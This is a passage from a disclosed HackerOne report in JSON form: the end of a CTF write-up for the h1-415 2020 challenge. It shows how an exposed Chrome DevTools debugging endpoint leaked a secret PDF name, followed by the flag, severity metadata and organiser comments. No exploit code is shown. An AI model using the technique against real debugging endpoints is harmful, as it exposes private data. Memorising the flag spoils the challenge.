\u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9\u0026quot;} ]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nAs we can see, there is a *http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf* tab that is opened. By retrieving the secret document name, and trying to access it as a normal document, we can see the secret document here : \n\n*https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf*\n\nThe flag is *h1ctf{y3s_1m_c0sm1c_n0w}*\n\n\nThis was a nice challenge, thank you for that!\n\nBest regards,\nBlaklis\n\n## Impact\n\nAttackers are able to access the very secret document from Jobert!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-04T20:36:31.037Z","allow_singular_disclosure_after":-25870431.010013495,"singular_disclosure_allowed":true,"vote_count":10,"voters":["wi11","nytr0gen","checkm50","mashoud1122","0xacb","w--","nukedx","realtess","ihsinme","b9372d4605459ca97219795"],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6795748,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-17T00:14:19.504Z","updated_at":"2020-01-17T00:14:19.504Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6795750,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The formatting failed, sorry for that :(","markdown_message":"\u003cp\u003eThe formatting failed, sorry for that :(\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-17T00:15:13.666Z","updated_at":"2020-01-17T00:15:13.666Z","actor":{"username":"blaklis","cleared":false,"url":"/blaklis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6795766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for playing! ","markdown_message":"\u003cp\u003eThanks for playing! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-17T00:21:13.946Z","updated_at":"2020-01-17T00:21:13.946Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6852645,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.588Z","updated_at":"2020-01-23T18:13:03.588Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934814,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.357Z","updated_at":"2020-01-31T18:04:59.357Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953829,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.365Z","updated_at":"2020-02-03T20:32:39.365Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"blaklis","url":"/blaklis"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953871,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:36:30.940Z","updated_at":"2020-02-03T20:36:30.940Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954813,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T22:42:23.629Z","updated_at":"2020-02-03T22:42:23.629Z","actor":{"username":"blaklis","cleared":false,"url":"/blaklis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954814,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T22:42:23.695Z","updated_at":"2020-02-03T22:42:23.695Z","actor":{"username":"blaklis","cleared":false,"url":"/blaklis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7057777,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there you were one of the first 5 to solve this CTF! Can you please email community@hackerone.com with your address and shirt/hoodie size and we'll send you some swag! Please make sure to include \"H1-415 CTF Winner\" in the title. \n\nCheers! ","markdown_message":"\u003cp\u003eHi there you were one of the first 5 to solve this CTF! Can you please email \u003ca title=\"community@hackerone.com\" href=\"mailto:community@hackerone.com\" rel=\"nofollow noopener noreferrer\"\u003ecommunity@hackerone.com\u003c/a\u003e with your address and shirt/hoodie size and we\u0026#39;ll send you some swag! Please make sure to include \u0026quot;H1-415 CTF Winner\u0026quot; in the title. \u003c/p\u003e\n\n\u003cp\u003eCheers! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-15T00:15:32.363Z","updated_at":"2020-02-15T00:15:32.363Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8236800,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:08.873Z","updated_at":"2020-06-08T21:12:08.873Z","additional_data":{"old_title":"My writeup on how to retrieve the special secret document","new_title":"[h1-415 2020] My writeup on how to retrieve the special secret document"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}